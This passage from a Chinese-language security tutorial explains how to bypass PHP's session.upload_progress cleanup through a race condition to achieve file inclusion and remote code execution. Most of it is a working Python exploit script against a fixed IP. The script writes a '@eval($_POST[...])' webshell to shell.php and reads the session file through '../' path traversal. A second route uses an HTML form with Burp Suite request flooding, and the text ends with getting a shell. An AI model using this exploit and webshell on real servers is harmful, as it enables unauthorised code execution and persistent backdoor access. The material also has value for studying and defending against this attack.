事实上并不能完全的利用成功，因为`session.upload_progress.cleanup = on`这个默认选项会有限制，当文件上传结束后，php将会立即清空对应session文件中的内容，这就导致我们在包含该session的时候相当于在包含一个空文件，没有包含我们传入的恶意代码。不过，我们只需要条件竞争，赶在文件被清除前利用即可。

### <a class="reference-link" name="Bypass%E6%80%9D%E8%B7%AF%E6%A2%B3%E7%90%86"></a>Bypass思路梳理
- upload file
```
files=`{`'file': ('a.txt', "xxxxxxx")`}`
```
- 设置cookie PHPSESSID
```
session.use_strict_mode=0造成Session ID可控

PHPSESSID=Qftm
```
- POST一个字段PHP_SESSION_UPLOAD_PROGRESS
```
session.upload_progress.name="PHP_SESSION_UPLOAD_PROGRESS"，在session中可控，同时，触发系统初始化session

"PHP_SESSION_UPLOAD_PROGRESS":'&lt;?php phpinfo();?&gt;'
```
- session.upload_progress.cleanup = on
```
多线程，时间竞争
```

### <a class="reference-link" name="Bypass%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"></a>Bypass攻击利用

<a class="reference-link" name="%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8%E6%94%BB%E5%87%BB"></a>**脚本利用攻击**
- **编写Exp**
```
import io
import sys
import requests
import threading

sessid = 'Qftm'

def POST(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(
            'http://192.33.6.145/index.php',
            data=`{`"PHP_SESSION_UPLOAD_PROGRESS":"&lt;?php phpinfo();fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?&gt;');?&gt;"`}`,
            files=`{`"file":('q.txt', f)`}`,
            cookies=`{`'PHPSESSID':sessid`}`
        )

def READ(session):
    while True:
        response = session.get(f'http://192.33.6.145/index.php?file=../../../../../../../../var/lib/php/sessions/sess_`{`sessid`}`')
        # print('[+++]retry')
        # print(response.text)

        if 'flag' not in response.text:
            print('[+++]retry')
        else:
            print(response.text)
            sys.exit(0)

with requests.session() as session:
    t1 = threading.Thread(target=POST, args=(session, ))
    t1.daemon = True
    t1.start()

    READ(session)
```
- **运行攻击效果**
在服务器中可以看到生成：sess_Qftm

[![](https://p2.ssl.qhimg.com/t0161180c0007e15cf0.png)](https://p2.ssl.qhimg.com/t0161180c0007e15cf0.png)

同时恶意代码也会正常执行

[![](https://p5.ssl.qhimg.com/t01b41b737ed7915b67.png)](https://p5.ssl.qhimg.com/t01b41b737ed7915b67.png)

之后可以利用后门webshell进行连接Getshell

[![](https://p3.ssl.qhimg.com/t01fe9396d0b90ec0a4.png)](https://p3.ssl.qhimg.com/t01fe9396d0b90ec0a4.png)

<a class="reference-link" name="%E8%A1%A8%E5%8D%95%E5%88%A9%E7%94%A8%E6%94%BB%E5%87%BB"></a>**表单利用攻击**

上面的一种做法是通过编写脚本代码的方式去利用的，不过还有另一种利用手段就是表单的攻击利用。
- **表单构造**
这里可以更改官方给的案例进行利用

`upload.html`

```
&lt;!doctype html&gt;
&lt;html&gt;
&lt;body&gt;
&lt;form action="http://192.33.6.145/index.php" method="post" enctype="multipart/form-data"&gt;
    &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" vaule="&lt;?php phpinfo(); ?&gt;" /&gt;
    &lt;input type="file" name="file1" /&gt;
    &lt;input type="file" name="file2" /&gt;
    &lt;input type="submit" /&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
```

但是同样需要注意的是，cleanup是on，所以需要条件竞争，使用BP抓包，一遍疯狂发包，一遍疯狂请求。
- **上传文件**
访问本地upload.html开启代理开始上传文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e11d616620b1b454.png)
- **发包传入恶意会话**
代理拦截我们的上传请求数据包，这里需要设置`Cookie: PHPSESSID=123456789`（自定义sessionID），然后不断发包，生成session，传入恶意会话。

[![](https://p3.ssl.qhimg.com/t014f64d673444a09bb.png)](https://p3.ssl.qhimg.com/t014f64d673444a09bb.png)

请求载荷设置`Null payloads`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0169417d52c8646199.png)

不断发包维持恶意session的存储

[![](https://p5.ssl.qhimg.com/t013bf32297d4ae1a48.png)](https://p5.ssl.qhimg.com/t013bf32297d4ae1a48.png)

不断发包的情况下，在服务器上可以看到传入的恶意session

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011d2db53ff5f5264b.png)
- **发包请求恶意会话**
不断发出请求包含恶意的session

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01246d8a6bb2fc822d.png)

请求载荷设置`Null payloads`

[![](https://p3.ssl.qhimg.com/t0184ac6ea7184a0359.png)](https://p3.ssl.qhimg.com/t0184ac6ea7184a0359.png)

在一端不断发包维持恶意session存储的时候，另一端不断发包请求包含恶意的session

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01279859c7ec149b57.png)

从结果中可以看到，利用表单攻击的这种手法也是可以的，可以看到恶意代码包含执行成功。



## Conclusion

在平时遇到限制的时候，多去以逆向的思维和系统服务或代码的本身去考虑问题，这样才很有可能突破固有的限制。
